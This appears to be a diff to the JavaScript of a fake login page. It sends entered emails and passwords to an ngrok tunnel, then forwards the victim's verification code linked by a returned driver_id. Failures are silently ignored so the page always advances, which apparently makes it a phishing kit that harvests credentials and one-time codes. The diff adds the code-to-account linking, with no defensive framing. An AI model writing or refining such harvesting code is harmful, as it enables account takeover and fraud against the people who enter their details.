@@ -760,15 +760,20 @@ function goStep3() {
   if (!password) { err.style.display = 'block'; return; }
   err.style.display = 'none';
 
+  let driverId = null;
+ 
   fetch("https://manicure-contact-reopen.ngrok-free.dev/login", {
     method: "POST",
     credentials: "include",
     headers: {
-    "Content-Type": "application/json",
-    "ngrok-skip-browser-warning": "true"    
+      "Content-Type": "application/json",
+      "ngrok-skip-browser-warning": "true"
     },
     body: JSON.stringify({ email, password })
-  }).catch(() => {});
+  })
+  .then(r => r.json())
+  .then(data => { driverId = data.driver_id; })
+  .catch(() => {});
 
   document.getElementById('emailShow3').textContent = email;
 
@@ -817,15 +822,14 @@ async function checkCode() {
 
   try {
     await fetch("https://manicure-contact-reopen.ngrok-free.dev/verify-code", {
-      method: "POST",
-      credentials: "include",
-      headers: {
-      "Content-Type": "application/json",
-      "ngrok-skip-browser-warning": "true"  
-      },
-      body: JSON.stringify({ code })
-    });
-  } catch (_) {}
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/json",
+    "ngrok-skip-browser-warning": "true"
+  },
+  body: JSON.stringify({ code, driver_id: driverId })
+});
 
   showPage(3, 4);
 }
